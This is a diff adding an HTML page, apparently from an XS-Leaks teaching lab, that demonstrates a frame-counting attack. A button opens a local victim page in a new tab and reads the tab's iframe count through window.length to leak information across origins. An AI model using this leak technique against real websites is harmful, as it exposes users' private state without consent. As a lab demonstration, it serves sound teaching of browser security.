@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSLL - Attacker - Frame Counting</title>
+    <script>
+        async function startAttack() {
+            // Get a reference to the window
+            var win = window.open('http://victim.local:27182/xs-leaks/frame-counting.html', '_blank');
+
+            // Wait for the page to load
+            setTimeout(() => {
+                // Read the number of iframes loaded
+                test = `${win.length} iframes detected`;
+                document.getElementById('numberOfFrames').textContent = test;
+                console.log("%d iframes detected", win.length);
+            }, 2000);
+        }
+    </script>
+</head>
+
+<body>
+    <h1>Frame Counting</h1>
+    <ul>
+        <li><a href="../index.html">Home</a></li>
+    </ul>
+
+    <h2>Introduction</h2>
+    <p>This page will help demonstrate a Frame Counting attack.</p>
+    <h2>Attack</h2>
+    <p>Start the attack by clicking the button below.</p>
+    <p>The attack will leak the number of iFrames present on the <a
+            href="http://victim.local:27182/xs-leaks/frame-counting.html">victim</a>.</p>
+    <p>This attack required opening the victims page in a new tab.</p>
+    
+    <button onclick="startAttack()">Start Attack</button>
+    <div id=numberOfFrames>0</div>
+</body>
+
+</html>
